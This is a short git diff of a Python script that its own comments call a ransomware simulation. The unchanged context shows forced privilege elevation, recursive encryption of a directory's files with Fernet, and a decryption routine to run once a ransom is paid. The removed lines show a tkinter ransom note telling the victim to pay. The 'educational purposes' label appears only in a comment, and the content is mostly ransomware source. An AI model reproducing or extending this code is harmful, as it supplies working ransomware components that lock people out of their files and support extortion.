@@ -10,8 +10,6 @@ import os
 import sys
 import time
 from cryptography.fernet import Fernet
-import tkinter as tk
-from tkinter import messagebox
 from elevate import elevate
 
 elevate()
@@ -55,14 +53,6 @@ def encrypt_directory(directory):
                     encrypt_file(os.path.join(root, file))
                 except Exception as e:
                     print(f"Failed to encrypt {file}: {e}")
-    show_ransom_note()
-
-# Show ransom note using tkinter
-def show_ransom_note():
-    root = tk.Tk()
-    root.withdraw()
-    messagebox.showinfo("Ransomware Notice", "Your files have been encrypted. To recover them, please pay the ransom.")
-    root.destroy()
     
 # Decrypt all files after ransom is paid (for educational purposes)
 def decrypt_all_files():
@@ -71,7 +61,6 @@ def decrypt_all_files():
             decrypt_file(file)
         except Exception as e:
             print(f"Failed to decrypt {file}: {e}")
-    messagebox.showinfo("Decryption Complete", "All files have been decrypted.")
     sys.exit()
     
 # Main function to run the ransomware simulation
